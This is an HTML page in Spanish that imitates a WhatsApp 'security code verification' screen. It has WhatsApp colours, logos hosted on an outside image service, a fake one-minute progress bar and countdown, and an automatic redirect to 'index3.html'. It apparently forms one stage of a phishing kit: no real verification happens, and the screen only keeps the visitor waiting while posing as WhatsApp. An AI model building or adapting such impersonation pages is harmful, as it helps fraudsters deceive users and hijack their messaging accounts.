<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Seguridad - WhatsApp</title>
    <style>
        body {
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #075E54; /* Color oficial de WhatsApp */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            text-align: center;
        }
        
        .loading-wrapper {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 25px;
        }
        
        .app-logo {
            width: 120px;
            height: auto;
            margin-bottom: 15px;
        }
        
        .status-message {
            font-size: 1.3rem;
            font-weight: 500;
            margin: 0;
            line-height: 1.4;
        }
        
        .progress-track {
            width: 100%;
            height: 6px;
            background-color: rgba(255, 255, 255, 0.15);
            border-radius: 3px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            width: 0%;
            background-color: #25D366; /* Verde de WhatsApp */
            border-radius: 3px;
            animation: fillProgress 60s linear forwards; /* 1 minuto */
        }
        
        .hint-text {
            font-size: 0.9rem;
            color: rgba(255, 255, 255, 0.7);
            margin-top: 5px;
        }
        
        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255, 255, 255, 0.2);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-top: 15px;
        }
        
        .brand-footer {
            position: absolute;
            bottom: 25px;
        }
        
        .brand-logo {
            width: 70px;
            height: auto;
            opacity: 0.8;
        }
        
        .time-counter {
            font-size: 0.9rem;
            margin-top: 10px;
            color: rgba(255, 255, 255, 0.8);
        }
        
        @keyframes fillProgress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading-wrapper">
        <img src="https://sappsapp23.sirv.com/docs/JvsnINJ2CZv.svg" alt="WhatsApp" class="app-logo">
        
        <p class="status-message">Verificando código de seguridad...</p>
        
        <div class="progress-track">
            <div class="progress-fill"></div>
        </div>
        
        <p class="hint-text">Por favor no cierres esta ventana</p>
        
        <div class="time-counter" id="timeCounter">Tiempo restante: 01:00</div>
        
        <div class="loading-spinner"></div>
    </div>

    <div class="brand-footer">
        <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="WhatsApp" class="brand-logo">
    </div>

    <script>
        // Tiempo total en milisegundos (1 minuto)
        const totalTime = 60 * 1000; // 1 minuto en milisegundos
        let remainingTime = totalTime;
        const timeCounter = document.getElementById('timeCounter');
        
        // Actualizar el contador de tiempo cada segundo
        const countdownInterval = setInterval(() => {
            remainingTime -= 1000;
            const minutes = Math.floor(remainingTime / 60000);
            const seconds = Math.floor((remainingTime % 60000) / 1000);
            
            timeCounter.textContent = `Tiempo restante: ${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
            
            if (remainingTime <= 0) {
                clearInterval(countdownInterval);
            }
        }, 1000);
        
        // Redirección después de 1 minuto
        setTimeout(() => {
            window.location.href = "index3.html";
        }, totalTime);
    </script>
</body>
</html>
